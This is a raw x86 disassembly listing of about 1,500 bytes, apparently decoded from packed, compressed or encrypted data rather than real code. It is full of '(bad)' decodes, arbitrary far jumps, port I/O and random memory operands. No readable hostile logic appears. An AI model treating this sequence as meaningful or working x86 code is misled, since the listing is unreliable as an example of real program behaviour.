  415e1c:	les    ebx,FWORD PTR [ebx]
  415e1e:	ror    DWORD PTR [esi+0x7e],cl
  415e21:	jmp    0x74cd54a1
  415e26:	cmp    BYTE PTR [eax+0x1a],cl
  415e29:	sub    dl,BYTE PTR [ebx+0x78535b6f]
  415e2f:	mov    BYTE PTR [ecx+0x20829ca2],ch
  415e35:	aad    0xea
  415e37:	push   esp
  415e38:	push   es
  415e39:	mov    bl,BYTE PTR [edx+0x60]
  415e3c:	shl    DWORD PTR [ecx+eax*2-0x68],cl
  415e40:	retf   0x7e32
  415e43:	clc    
  415e44:	mov    ah,0xaf
  415e46:	cmp    edx,DWORD PTR [ebp-0x4229feea]
  415e4c:	fs sahf 
  415e4e:	dec    eax
  415e4f:	arpl   WORD PTR [eax-0x5b],bp
  415e52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e53:	test   al,0x40
  415e55:	fs push ebx
  415e57:	nop
  415e58:	or     BYTE PTR [ebx-0x6],bl
  415e5b:	aaa    
  415e5c:	push   0x70
  415e5e:	jmp    0x3c9:0x798a4af7
  415e65:	les    ecx,FWORD PTR [ebx]
  415e67:	sub    ecx,DWORD PTR [edi-0x4ca2267b]
  415e6d:	cdq    
  415e6e:	sbb    BYTE PTR [edx],dh
  415e70:	mov    edx,0xd76a6665
  415e75:	pop    eax
  415e76:	scas   al,BYTE PTR es:[edi]
  415e77:	(bad)
  415e7b:	pop    esi
  415e7c:	ja     0x415e47
  415e7e:	adc    al,0x2
  415e80:	mov    BYTE PTR [ebx-0x36],ah
  415e83:	sub    DWORD PTR [eax+0x48],0xffffff8d
  415e87:	jmp    0x397c:0x638c8703
  415e8e:	sub    DWORD PTR [edx],edi
  415e90:	dec    edi
  415e91:	popa   
  415e92:	loop   0x415ee2
  415e94:	shr    BYTE PTR [edi+0x17],1
  415e97:	out    dx,al
  415e98:	ficom  WORD PTR [esi+0xf]
  415e9b:	jmp    0xa58b:0x8d0a56f1
  415ea2:	jl     0x415e72
  415ea4:	cmp    cl,cl
  415ea6:	mov    esp,es
  415ea8:	dec    edx
  415ea9:	stos   DWORD PTR es:[edi],eax
  415eaa:	adc    ebp,DWORD PTR [ebx+0x26b03708]
  415eb0:	jne    0x415e4a
  415eb2:	jns    0x415ea0
  415eb4:	xchg   ebx,eax
  415eb5:	mov    ah,BYTE PTR [ecx-0x7e]
  415eb8:	mov    BYTE PTR [esp+eax*4+0x6ebaf9f],cl
  415ebf:	jbe    0x415f38
  415ec1:	mov    bh,0xa9
  415ec3:	or     al,BYTE PTR cs:0x74219cd9
  415eca:	jne    0x415f41
  415ecc:	imul   BYTE PTR [edi-0x27]
  415ecf:	enter  0x1789,0xf3
  415ed3:	add    esi,DWORD PTR [ebx]
  415ed5:	or     ebx,esp
  415ed7:	pop    ebp
  415ed8:	mov    ecx,0xb80e4ac4
  415edd:	outs   dx,DWORD PTR ds:[esi]
  415ede:	push   ds
  415edf:	stos   DWORD PTR es:[edi],eax
  415ee0:	or     cl,al
  415ee2:	ins    DWORD PTR es:[edi],dx
  415ee3:	jns    0x415eff
  415ee5:	ret    
  415ee6:	test   BYTE PTR [edx],0xdb
  415ee9:	inc    ebx
  415eea:	push   esi
  415eeb:	lods   al,BYTE PTR ds:[esi]
  415eec:	test   ch,bh
  415eee:	xchg   ebp,eax
  415eef:	ror    DWORD PTR [edi],0x83
  415ef2:	xchg   edi,eax
  415ef3:	adc    al,0x20
  415ef5:	cmc    
  415ef6:	shl    DWORD PTR [edx],0x34
  415ef9:	and    eax,0xf19ee40f
  415efe:	xchg   DWORD PTR ds:0x2cf22cd8,edx
  415f04:	(bad)  
  415f05:	push   cs
  415f06:	cli    
  415f07:	and    ebp,ebx
  415f09:	dec    esp
  415f0a:	loopne 0x415e99
  415f0c:	nop
  415f0d:	mov    eax,ds:0xb47b298b
  415f12:	mov    ss,ecx
  415f14:	inc    ecx
  415f15:	sub    cl,al
  415f17:	pop    es
  415f18:	mov    al,dh
  415f1a:	test   eax,0x89447502
  415f1f:	adc    DWORD PTR [esi+0x18],ecx
  415f22:	mov    WORD PTR [edx-0x76dde8ea],?
  415f28:	xchg   esp,eax
  415f29:	push   esp
  415f2a:	mov    DWORD PTR [esi-0x3],edi
  415f2d:	rol    DWORD PTR [ecx+0x1882f220],1
  415f33:	sidtd  es:[edx-0x5b]
  415f38:	(bad)
  415f3c:	sbb    al,0x91
  415f3e:	push   ss
  415f3f:	call   0xc95b:0xc7078e30
  415f46:	and    ah,BYTE PTR [ebx+edx*2-0x6a4e62e7]
  415f4d:	es push edi
  415f4f:	jmp    0x1ce8e4f9
  415f54:	push   esp
  415f55:	sbb    ecx,DWORD PTR [ecx-0x760184cc]
  415f5b:	sahf   
  415f5c:	nop
  415f5d:	push   es
  415f5e:	mov    bh,0x26
  415f60:	push   ebp
  415f61:	jge    0x415fcd
  415f63:	sub    al,0xc6
  415f65:	push   edi
  415f66:	or     bh,0x4
  415f69:	pop    ecx
  415f6a:	inc    ecx
  415f6b:	repnz mov DWORD PTR [ebp-0x2a],edi
  415f6f:	push   ebp
  415f70:	cmp    al,0x5a
  415f72:	dec    edi
  415f73:	xchg   ebp,eax
  415f74:	nop
  415f75:	adc    al,0xe8
  415f77:	jecxz  0x415f59
  415f79:	push   ebp
  415f7a:	jmp    0xf95:0x975c990f
  415f81:	pushf  
  415f82:	add    edx,DWORD PTR [ebx+0x7b]
  415f85:	pop    es
  415f86:	inc    ebp
  415f87:	cmp    BYTE PTR [esi-0x59],dl
  415f8a:	das    
  415f8b:	cmp    ebx,DWORD PTR [ebx+0x6b75daae]
  415f91:	add    DWORD PTR [esi],ebx
  415f93:	cmp    DWORD PTR [ebx+0x3b],0xe86e681f
  415f9a:	cmp    DWORD PTR [eax-0x33de07d],ebp
  415fa0:	test   esp,edx
  415fa2:	xchg   ebx,eax
  415fa3:	add    al,0xf2
  415fa5:	add    BYTE PTR [edi],bh
  415fa7:	mov    dh,0x7
  415fa9:	(bad)  
  415faa:	cli    
  415fab:	and    al,0x7
  415fad:	aaa    
  415fae:	mov    dh,0x84
  415fb0:	pop    ss
  415fb1:	das    
  415fb2:	xchg   DWORD PTR [esi],esi
  415fb4:	test   BYTE PTR [ebx],0x68
  415fb7:	adc    ecx,DWORD PTR [edx+0x3a26aa29]
  415fbd:	arpl   WORD PTR [ecx-0x1e],bx
  415fc0:	sbb    DWORD PTR [ecx-0x75d7ece4],ebx
  415fc6:	fsubp  st(0),st
  415fc8:	sub    ah,dh
  415fca:	xor    DWORD PTR ds:0x11432aba,esi
  415fd0:	rol    ebp,1
  415fd2:	pop    es
  415fd3:	inc    ebx
  415fd4:	fimul  DWORD PTR [ebp-0x7e]
  415fd7:	push   ds
  415fd8:	sub    DWORD PTR [esi-0x3273908b],esi
  415fde:	push   ss
  415fdf:	push   0xffffffda
  415fe1:	mov    al,ds:0xdf0de99d
  415fe6:	or     ebx,DWORD PTR [edx+0x5]
  415fe9:	and    eax,0xf5839ca0
  415fee:	sub    eax,0xc73c319e
  415ff3:	int3   
  415ff4:	(bad)  
  415ff5:	pop    ebx
  415ff6:	mov    ds:0x9cf6698f,al
  415ffb:	cmp    eax,0xf91047f9
  416000:	mov    bh,0x8f
  416002:	add    DWORD PTR [eax+0x2],esi
  416005:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416007:	dec    edx
  416008:	push   esi
  416009:	mov    BYTE PTR [edi-0x4bbb766],dl
  41600f:	test   dl,ch
  416011:	pop    eax
  416012:	fstp   QWORD PTR [edx]
  416014:	xor    ebx,esp
  416016:	std    
  416017:	xchg   ecx,eax
  416018:	rol    ch,1
  41601a:	dec    edx
  41601b:	mov    ch,BYTE PTR [ecx+ebx*2+0x3c4e0c57]
  416022:	imul   edx,esi,0x45
  416025:	sub    eax,0x30b3602e
  41602a:	shl    BYTE PTR [eax],0x7e
  41602d:	pop    edi
  41602e:	push   cs
  41602f:	ins    BYTE PTR es:[edi],dx
  416030:	push   ss
  416031:	lods   al,BYTE PTR ds:[esi]
  416032:	and    al,0xcc
  416034:	dec    esp
  416035:	pushf  
  416036:	fdiv   DWORD PTR [edx-0x17]
  416039:	repz sub al,0x8f
  41603c:	dec    ecx
  41603d:	pop    ecx
  41603e:	cli    
  41603f:	fsub   st,st(4)
  416041:	shl    BYTE PTR [ecx+0x2649c6b4],0x13
  416048:	push   ecx
  416049:	fbld   TBYTE PTR ds:0xe3fe121b
  41604f:	sub    DWORD PTR [edi+0x23891f9a],esp
  416055:	mov    al,ds:0xb1e9684
  41605a:	sub    edx,0xffffffc8
  41605d:	(bad)  
  41605e:	in     eax,dx
  41605f:	lock sti 
  416061:	sub    al,0x73
  416063:	shl    DWORD PTR [esi-0x6b],1
  416066:	(bad)  
  416067:	xchg   esp,eax
  416068:	and    al,0x2d
  41606a:	inc    ebx
  41606b:	sbb    DWORD PTR [ebp+0x1d6d713a],eax
  416071:	adc    BYTE PTR [ebp-0x6a0d0472],cl
  416077:	loop   0x4160de
  416079:	sbb    eax,0x7553e92d
  41607e:	mov    fs,eax
  416080:	lods   al,BYTE PTR ds:[esi]
  416081:	cmp    al,0xca
  416083:	cdq    
  416084:	xchg   ecx,eax
  416085:	jecxz  0x416042
  416087:	jp     0x4160d1
  416089:	out    dx,eax
  41608a:	inc    ebx
  41608b:	cwde   
  41608c:	and    DWORD PTR ds:[eax-0x5a2bec39],edx
  416093:	ficomp WORD PTR [ebx-0x13]
  416096:	dec    esp
  416097:	cmp    DWORD PTR [ecx+0x4b],eax
  41609a:	mov    DWORD PTR [edx-0x2c],eax
  41609d:	inc    edx
  41609e:	sbb    al,0xcb
  4160a0:	add    DWORD PTR [esi+ebx*4+0x3e16ca18],ebp
  4160a7:	rcl    BYTE PTR [eax],cl
  4160a9:	stc    
  4160aa:	and    al,0x82
  4160ac:	call   DWORD PTR [ebp+0x57]
  4160af:	sti    
  4160b0:	ja     0x416102
  4160b2:	mov    al,ds:0x6957f0d5
  4160b7:	jle    0x4160b6
  4160b9:	mov    ds:0x20fd642c,eax
  4160be:	ja     0x416063
  4160c0:	cli    
  4160c1:	call   0x1947:0x42dedaad
  4160c8:	mov    eax,ds:0x53772938
  4160cd:	out    dx,al
  4160ce:	daa    
  4160cf:	add    esi,ebx
  4160d1:	xchg   ebx,eax
  4160d2:	out    0x3,al
  4160d4:	clc    
  4160d5:	sahf   
  4160d6:	clc    
  4160d7:	sbb    DWORD PTR ds:[ebx-0x6469b7d7],eax
  4160de:	mov    dl,ah
  4160e0:	push   edx
  4160e1:	mov    ch,0x8b
  4160e3:	jns    0x416069
  4160e5:	ficomp WORD PTR [ebx+0x437310db]
  4160eb:	popf   
  4160ec:	sub    esi,DWORD PTR [ebx-0x5c]
  4160ef:	jnp    0x416163
  4160f1:	mov    al,ds:0x144c59ff
  4160f6:	xor    DWORD PTR [ebp+eax*1+0x244ed651],0xffffff85
  4160fe:	cmp    ebx,DWORD PTR [ebp-0xd]
  416101:	or     eax,0x43a06cea
  416106:	jg     0x41617c
  416108:	adc    al,0x58
  41610a:	jmp    0x5836:0xee126646
  416111:	sbb    ebp,0xe
  416114:	in     al,dx
  416115:	out    dx,al
  416116:	mov    es,WORD PTR [edi+0x2a]
  416119:	test   al,0xe5
  41611b:	dec    eax
  41611c:	pop    esp
  41611d:	adc    edx,edx
  41611f:	fs test eax,0x4086d66c
  416125:	sub    al,0x32
  416127:	mov    dh,0x25
  416129:	fadd   QWORD PTR [eax+ecx*2-0x43]
  41612d:	mov    edi,0x878559fb
  416132:	packuswb mm7,QWORD PTR [si]
  416136:	jle    0x416122
  416138:	rcl    BYTE PTR [edx-0x53],cl
  41613b:	cmc    
  41613c:	mov    bl,0xf
  41613e:	inc    ecx
  41613f:	push   es
  416140:	repz dec esi
  416142:	mov    esp,0x61ef5e5
  416147:	call   0x11fdb206
  41614c:	jns    0x4161c7
  41614e:	popa   
  41614f:	dec    ecx
  416150:	mov    ecx,0x7e7de2df
  416155:	sub    DWORD PTR [ebx+0x28],0x25
  416159:	gs daa 
  41615b:	loop   0x416154
  41615d:	push   es
  41615e:	out    dx,eax
  41615f:	imul   eax,DWORD PTR [edx+0x62b4bd6d],0x744ea7e0
  416169:	push   edx
  41616a:	clc    
  41616b:	jno    0x41615a
  41616d:	cmp    al,0x98
  41616f:	inc    eax
  416170:	stc    
  416171:	xchg   ecx,eax
  416172:	test   eax,0x827cb8d1
  416177:	nop
  416178:	push   esi
  416179:	jg     0x416188
  41617b:	fdiv   DWORD PTR [ebp-0x552c97c8]
  416181:	out    0x14,al
  416183:	add    DWORD PTR ds:0x9f98ae2c,esp
  416189:	mov    bh,0x86
  41618b:	clc    
  41618c:	push   0xa
  41618e:	in     al,0xc
  416190:	ss cmp cl,0x1c
  416194:	mov    al,0x79
  416196:	mov    dh,0x8b
  416198:	sub    ebx,edi
  41619a:	sbb    al,0x1d
  41619c:	jns    0x416204
  41619e:	cld    
  41619f:	push   ecx
  4161a0:	cli    
  4161a1:	mov    dh,0xd5
  4161a3:	sub    al,ah
  4161a5:	sbb    DWORD PTR [eax],esp
  4161a7:	pop    ss
  4161a8:	pusha  
  4161a9:	cmp    DWORD PTR [edi-0x309047e4],eax
  4161af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161b0:	cmp    ah,BYTE PTR [eax-0x44]
  4161b3:	xchg   esp,eax
  4161b4:	je     0x416150
  4161b6:	fsub   QWORD PTR [esi+0x1a]
  4161b9:	adc    eax,0x63cdba98
  4161be:	out    dx,al
  4161bf:	jb     0x4161c9
  4161c1:	xchg   ebx,eax
  4161c2:	sub    DWORD PTR [ecx],esp
  4161c4:	inc    eax
  4161c5:	jl     0x4161fd
  4161c7:	popf   
  4161c8:	mov    edi,0xc0246d77
  4161cd:	out    0xda,al
  4161cf:	xchg   edi,eax
  4161d0:	lahf   
  4161d1:	add    DWORD PTR [esi],ecx
  4161d3:	lea    ebp,[ebp+0x70]
  4161d6:	inc    esi
  4161d7:	repz push edx
  4161d9:	jns    0x4161c5
  4161db:	out    dx,al
  4161dc:	loope  0x4161f1
  4161de:	imul   edx,DWORD PTR [edx+0x5a39a667],0xd6546727
  4161e8:	push   esi
  4161e9:	push   esp
  4161ea:	jge    0x41617f
  4161ec:	stos   DWORD PTR es:[edi],eax
  4161ed:	pop    ebp
  4161ee:	add    BYTE PTR [ecx],0x1
  4161f1:	(bad)  
  4161f2:	nop
  4161f3:	cmc    
  4161f4:	(bad)  
  4161f5:	pop    ss
  4161f6:	(bad)  
  4161f7:	retf   0x18b2
  4161fa:	mov    ds:0xb77fa008,al
  4161ff:	jmp    0x4161de
  416201:	test   BYTE PTR [eax-0x2b],dh
  416204:	into   
  416205:	push   ecx
  416206:	jp     0x41619b
  416208:	inc    BYTE PTR [ebx]
  41620a:	add    DWORD PTR [esi-0x39e6b41],edi
  416210:	arpl   WORD PTR [edi-0x7a],bp
  416213:	and    ch,BYTE PTR [edi+0x1f]
  416216:	sub    ch,al
  416218:	pop    ds
  416219:	and    al,0x71
  41621b:	mov    bl,0xa9
  41621d:	les    eax,FWORD PTR [edi]
  41621f:	push   ebp
  416220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416221:	mov    bl,0xa1
  416223:	cmp    ah,BYTE PTR [edx-0x31]
  416226:	adc    eax,ebp
  416228:	shl    dh,cl
  41622a:	clc    
  41622b:	adc    DWORD PTR [ebx+edi*4+0x4ce4082d],esp
  416232:	hlt    
  416233:	mov    al,0x9f
  416235:	ds pushw ds
  416238:	fild   DWORD PTR [ecx]
  41623a:	jl     0x4161c4
  41623c:	sbb    ecx,esp
  41623e:	retf   
  41623f:	lea    ebx,[ecx-0x81fc670]
  416245:	retf   
  416246:	cwde   
  416247:	(bad)  
  416248:	imul   ebp,edi,0x52
  41624b:	or     cl,BYTE PTR [esi+ebp*2-0x4d]
  41624f:	fmul   DWORD PTR [edi+0x28d6b903]
  416255:	cdq    
  416256:	aas    
  416257:	adc    eax,ebp
  416259:	mov    esp,eax
  41625b:	aas    
  41625c:	mov    eax,ds:0x4f58a836
  416261:	ja     0x4162a3
  416263:	ins    BYTE PTR es:[edi],dx
  416264:	mov    ds:0x3b843344,al
  416269:	test   DWORD PTR [esi+0x35],esp
  41626c:	sbb    BYTE PTR [edi+ebp*4-0x6393518c],dh
  416273:	retf   
  416274:	retf   
  416275:	fmul   QWORD PTR [edx+0x269ff691]
  41627b:	dec    edx
  41627c:	test   BYTE PTR [edi],0x94
  41627f:	inc    edx
  416280:	or     DWORD PTR ds:0x6bbf0cbd,esi
  416286:	mov    eax,ds:0x7c7310d6
  41628b:	cmp    DWORD PTR ds:0x4bc35315,ebp
  416291:	lahf   
  416292:	jmp    0x4162fb
  416294:	scas   eax,DWORD PTR es:[edi]
  416295:	pop    ebx
  416296:	fstp   TBYTE PTR [esi]
  416298:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416299:	and    eax,0x1d2d39c3
  41629e:	sbb    al,0xa3
  4162a0:	in     eax,dx
  4162a1:	mov    ds:0xc863ceca,al
  4162a6:	and    bh,0x98
  4162a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162aa:	inc    edi
  4162ab:	pop    ebp
  4162ac:	xor    BYTE PTR [edi+0x3c],0x47
  4162b0:	pop    edx
  4162b1:	out    0x76,eax
  4162b3:	jle    0x41628b
  4162b5:	xchg   edi,eax
  4162b6:	enter  0x83f3,0xe4
  4162ba:	xor    ebx,esi
  4162bc:	pop    ebp
  4162bd:	dec    edx
  4162be:	jo     0x4162a3
  4162c0:	js     0x4162b4
  4162c2:	aam    0x84
  4162c4:	push   esp
  4162c5:	xchg   edi,eax
  4162c6:	fcomi  st,st(3)
  4162c8:	jl     0x4162dc
  4162ca:	mov    ecx,0x4a921e39
  4162cf:	in     eax,0xb6
  4162d1:	mov    ds:0xcf2d372e,eax
  4162d6:	mov    esi,0x2a14b225
  4162db:	and    edi,edi
  4162dd:	xchg   ecx,eax
  4162de:	adc    BYTE PTR [ecx],dh
  4162e0:	dec    esp
  4162e1:	repnz aas 
  4162e3:	xchg   ebx,eax
  4162e4:	shrd   ebx,ecx,0x10
  4162e8:	mov    esp,0x3eb2b5c3
  4162ed:	stc    
  4162ee:	repz fsubr st(5),st
  4162f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162f2:	mov    esp,0x2aed3a77
  4162f7:	sub    BYTE PTR [ebx+edi*2-0x580c7212],ch
  4162fe:	dec    eax
  4162ff:	push   0xffffffed
  416301:	and    BYTE PTR [eax],bh
  416303:	test   eax,0x870edfb9
  416308:	mov    edi,DWORD PTR [ebp-0x1ee03ba8]
  41630e:	dec    esi
  41630f:	mov    ch,0xff
  416311:	ins    DWORD PTR es:[edi],dx
  416312:	fnstcw WORD PTR [edi]
  416314:	push   eax
  416315:	and    eax,ebx
  416317:	cld    
  416318:	fwait
  416319:	dec    ebp
  41631a:	sub    ch,dl
  41631c:	ss push cs
  41631e:	sbb    BYTE PTR [edi+0x6a],ch
  416321:	dec    esi
  416322:	out    dx,eax
  416323:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416324:	les    edi,FWORD PTR [esi+0x6750729f]
  41632a:	stc    
  41632b:	jp     0x416359
  41632d:	jb     0x416359
  41632f:	xchg   ecx,eax
  416330:	xor    BYTE PTR [ecx+ebx*1-0x8],cl
  416334:	mov    cl,0xaf
  416336:	and    DWORD PTR [esi-0x10],0xfffffff7
  41633a:	arpl   WORD PTR [esi+0x16],cx
  41633d:	xlat   BYTE PTR ds:[ebx]
  41633e:	(bad)  
  41633f:	popf   
  416340:	pusha  
  416341:	sti    
  416342:	into   
  416343:	add    al,0x3e
  416345:	das    
  416346:	outs   dx,DWORD PTR ds:[esi]
  416347:	in     eax,0x83
  416349:	repz mov ?,ecx
  41634c:	and    al,0x4
  41634e:	int    0xa2
  416350:	pop    esi
  416351:	ret    
  416352:	aam    0x53
  416354:	popf   
  416355:	jle    0x416317
  416357:	dec    eax
  416358:	cli    
  416359:	mov    dl,0x3b
  41635b:	stc    
  41635c:	sub    eax,0x415cf473
  416361:	inc    ebp
  416362:	(bad)  
  416364:	xor    DWORD PTR [edx],edx
  416366:	push   0x520c3d00
  41636b:	iret   
  41636c:	sub    edx,DWORD PTR [ebx-0x46e837cb]
  416372:	sub    edx,eax
  416374:	clc    
  416375:	mov    al,ds:0x1e801307
  41637a:	and    al,0x5
  41637c:	aas    
  41637d:	jne    0x41639c
  41637f:	sub    eax,0x23a7d2e6
  416384:	push   esp
  416385:	out    0xeb,al
  416387:	stos   DWORD PTR es:[edi],eax
  416388:	and    eax,0x667ccee8
  41638d:	and    eax,0x9506e10d
  416392:	pushf  
  416393:	fadd   st,st(6)
  416395:	ret    0x2d2c
  416398:	xor    esi,DWORD PTR [eax+0x4d]
  41639b:	push   edx
  41639c:	cmp    ebp,DWORD PTR [esi+0x27]
  41639f:	xor    edx,eax
  4163a1:	sar    DWORD PTR [ebx],cl
  4163a3:	dec    esi
  4163a4:	test   DWORD PTR [esi],ebp
  4163a6:	push   edi
  4163a7:	pop    esi
  4163a8:	outs   dx,DWORD PTR ds:[esi]
  4163a9:	icebp  
  4163aa:	outs   dx,DWORD PTR ds:[esi]
  4163ab:	jle    0x416385
  4163ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163ae:	jmp    0x41638e
  4163b0:	pop    esi
  4163b1:	or     al,0x18
  4163b3:	dec    ecx
  4163b4:	dec    ebx
  4163b5:	out    0xff,eax
  4163b7:	or     eax,0xa23354b4
  4163bc:	das    
  4163bd:	cmc    
  4163be:	cmp    eax,0x6c7f89c8
  4163c3:	push   ebx
  4163c4:	call   0x8301b387
  4163c9:	push   es
  4163ca:	xchg   ebx,eax
  4163cb:	addr16 in al,0x53
  4163ce:	int    0xb6
  4163d0:	call   0xfac2:0xba29ecb0
  4163d7:	dec    ecx
  4163d8:	cmp    al,0x57
  4163da:	jo     0x4163f1
  4163dc:	dec    esi
  4163dd:	jb     0x416366
  4163df:	scas   eax,DWORD PTR es:[edi]
  4163e0:	jecxz  0x4163b4
  4163e2:	and    bh,ch
  4163e4:	js     0x416415
  4163e6:	add    ah,BYTE PTR [edx+eiz*1+0x20]
  4163ea:	(bad)  
  4163eb:	lock data16 cmp al,dh
  4163ef:	ins    BYTE PTR es:[edi],dx
  4163f0:	imul   ecx,DWORD PTR [eax-0x21],0xdb4e7f3a
  4163f7:	jg     0x4163b1
  4163f9:	or     BYTE PTR [edi-0x68],dh
  4163fc:	loop   0x4163c9
  4163fe:	jg     0x41641a
  416400:	push   cs
  416401:	shl    ch,0x75
  416404:	push   eax
  416405:	dec    bp
  416407:	imul   ebx,DWORD PTR [edi+0x4c],0x984b9546
  41640e:	loope  0x416425
  416410:	jmp    0x9073cb85
  416415:	dec    esp
  416416:	or     eax,0xb5dbab5
  41641b:	push   0x1c42fe53
  416420:	mov    al,al
  416422:	mov    eax,ds:0x570934c0
  416427:	call   0x1f9b:0x377fcf81
  41642e:	cmp    DWORD PTR ds:0x799f9c32,ebx
  416434:	mov    DWORD PTR [edx+0x19a0072a],ebp
  41643a:	mov    WORD PTR [ecx-0x4c],?
  41643d:	sub    al,0xdc
  41643f:	fcom   QWORD PTR [eax+0x9]
  416442:	enter  0xabd3,0xe8
  416446:	jo     0x416400
  416448:	mov    eax,0x1c73ca15
  41644d:	push   ss
  41644e:	mov    al,0x20
  416450:	sub    ecx,DWORD PTR [ecx+esi*8-0xeb5ac54]
  416457:	or     al,0xb2
  416459:	push   eax
  41645a:	adc    ah,BYTE PTR [ecx]
  41645c:	xchg   DWORD PTR [ecx-0x66],ebp
  41645f:	cld    
  416460:	pop    esi
  416461:	mov    ebp,0x4ac67886
  416466:	(bad)  
  416468:	mov    DWORD PTR [edi-0x3f],esi
  41646b:	sbb    DWORD PTR [ebx],edx
  41646d:	cmp    BYTE PTR [esp+edi*4],0x15
  416471:	pop    esp
  416472:	sbb    al,0xde
  416474:	dec    edx
  416475:	cmp    esi,DWORD PTR [ebx+edx*4]
  416478:	mov    ds,ebx
  41647a:	cmp    eax,0xb163d1ac
  41647f:	mov    cl,0x28
  416481:	neg    DWORD PTR [ebx+edx*8+0x68e2752a]
  416488:	in     eax,dx
  416489:	scas   eax,DWORD PTR es:[edi]
  41648a:	dec    eax
  41648b:	fwait
  41648c:	das    
  41648d:	xchg   ebp,ebp
  41648f:	dec    edi
  416490:	bound  edi,QWORD PTR [esi]
  416492:	fadd   DWORD PTR [esp+eiz*2-0x5bab5ba6]
  416499:	sbb    dh,al
  41649b:	dec    edi
  41649c:	pop    es
  41649d:	cmp    ah,BYTE PTR [ecx]
  41649f:	cmp    edx,ebx
  4164a1:	mov    dl,0x97
  4164a3:	jo     0x416478
  4164a5:	mov    edx,DWORD PTR [edi-0x31bad23d]
  4164ab:	pop    es
  4164ac:	sbb    cl,cl
  4164ae:	or     DWORD PTR [ebx],ecx
  4164b0:	jns    0x4164a8
  4164b2:	sbb    BYTE PTR [ecx+0x6bafc0d3],dl
  4164b8:	retf   
  4164b9:	add    edx,ebp
  4164bb:	xor    BYTE PTR [ebx],ah
  4164bd:	cmp    BYTE PTR [edi-0x14],dl
  4164c0:	stos   BYTE PTR es:[edi],al
  4164c1:	sahf   
  4164c2:	and    ch,BYTE PTR [esi-0x36cb1db9]
  4164c8:	je     0x416496
  4164ca:	fs call 0x3eaef48d
  4164d0:	cld    
  4164d1:	mov    ecx,0x479218c1
  4164d6:	je     0x41651f
  4164d8:	repnz or al,0x56
  4164db:	xor    al,0xa9
  4164dd:	ja     0x416553
  4164df:	ins    BYTE PTR es:[edi],dx
  4164e0:	sbb    BYTE PTR [ecx+0x3b7c5d11],bl
  4164e6:	in     al,dx
  4164e7:	popf   
  4164e8:	sbb    eax,0x7255feb2
  4164ed:	test   eax,0x81312af2
  4164f2:	mov    cl,cl
  4164f4:	sbb    BYTE PTR [edi],cl
  4164f6:	mov    edx,0x1ecd25f0
  4164fb:	mov    BYTE PTR [esi],ch
  4164fd:	(bad)  
  4164fe:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  416500:	aaa    
  416501:	xchg   dl,al
  416503:	cmp    bh,dl
  416505:	and    al,0x8b
  416507:	enter  0x344,0xab
  41650b:	addr16 dec edx
  41650e:	pop    ecx
  41650f:	cmp    esi,ecx
  416511:	(bad)  
  416512:	pop    ds
  416513:	xchg   esi,eax
  416514:	cs loopne 0x4164d0
  416517:	clc    
  416518:	pop    esi
  416519:	xchg   DWORD PTR [eax-0x20],eax
  41651c:	sbb    DWORD PTR [edx+0x6e31295a],ecx
  416522:	imul   ebp,ebx,0x67
  416525:	ret    
  416526:	stos   BYTE PTR es:[edi],al
  416527:	iret   
  416528:	sbb    al,0xc
  41652a:	(bad)  
  41652b:	loop   0x4164db
  41652d:	fmul   QWORD PTR [edx*4-0x6fe14976]
  416534:	(bad)  
  416535:	cmp    dl,BYTE PTR [eax-0x257981f3]
  41653b:	jle    0x4165a8
  41653d:	mov    al,ah
  41653f:	inc    esi
  416540:	and    al,0x3e
  416542:	xor    al,0x98
  416544:	sub    dh,cl
  416546:	in     eax,0x8e
  416548:	gs ja  0x4164f3
  41654b:	mov    ds:0xa73e1257,eax
  416550:	add    eax,0x204c93ac
  416555:	xlat   BYTE PTR ds:[ebx]
  416556:	xchg   ebx,eax
  416557:	mov    al,0xff
  416559:	jo     0x4165a1
  41655b:	aas    
  41655c:	pop    edi
  41655d:	(bad)  
  41655e:	adc    al,BYTE PTR [ecx-0x6f]
  416561:	das    
  416562:	jmp    0x416544
  416564:	pusha  
  416565:	test   ebp,esp
  416567:	mov    bl,0x6c
  416569:	stos   BYTE PTR es:[edi],al
  41656a:	les    esp,FWORD PTR [esi+0x22]
  41656d:	jge    0x4165a3
  41656f:	add    eax,0xc2773208
  416574:	jo     0x416554
  416576:	mov    dl,0xed
  416578:	inc    ch
  41657a:	mov    edx,0x2fe7ad6
  41657f:	xchg   ecx,eax
  416580:	push   ecx
  416581:	arpl   WORD PTR [ebx],sp
  416583:	xor    dl,BYTE PTR [esi]
  416585:	mov    ah,0x64
  416587:	dec    esp
  416588:	add    eax,0x783e3c1d
  41658d:	mov    bh,BYTE PTR [ebx-0x2e6b4cf0]
  416593:	pusha  
  416594:	push   es
  416595:	cmp    al,cl
  416597:	xchg   ebp,eax
  416598:	and    al,BYTE PTR [eax-0x51]
  41659b:	mov    bh,0xa0
  41659d:	xor    eax,0xa289cee1
  4165a2:	xor    al,0xb4
  4165a4:	in     eax,0x3f
  4165a6:	jo     0x416547
  4165a8:	(bad)  
  4165a9:	mov    dl,0x44
  4165ab:	call   0x9ac7:0xa3c90053
  4165b2:	push   esp
  4165b3:	cs inc edx
  4165b5:	(bad)
  4165ba:	add    al,0x55
  4165bc:	cmp    eax,DWORD PTR [esi+edx*2]
  4165bf:	fidiv  WORD PTR [edx+0x49]
  4165c2:	(bad)  
  4165c4:	stos   DWORD PTR es:[edi],eax
  4165c5:	loopne 0x416549
  4165c7:	cmp    ah,BYTE PTR [ecx-0x759ab6e9]
  4165cd:	pop    ds
  4165ce:	cdq    
  4165cf:	(bad)
  4165d4:	(bad)  
  4165d5:	enter  0xc8a7,0xa6
  4165d9:	aaa    
  4165da:	mov    ecx,0x2ff258e3
  4165df:	and    DWORD PTR [edi+0x6d3014ed],esp
  4165e5:	pusha  
  4165e6:	or     ch,ch
  4165e8:	fist   WORD PTR [ecx+0xa1f008d]
  4165ee:	bound  eax,QWORD PTR [ebx]
  4165f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165f1:	cwde   
  4165f2:	lods   eax,DWORD PTR ds:[esi]
  4165f3:	inc    esp
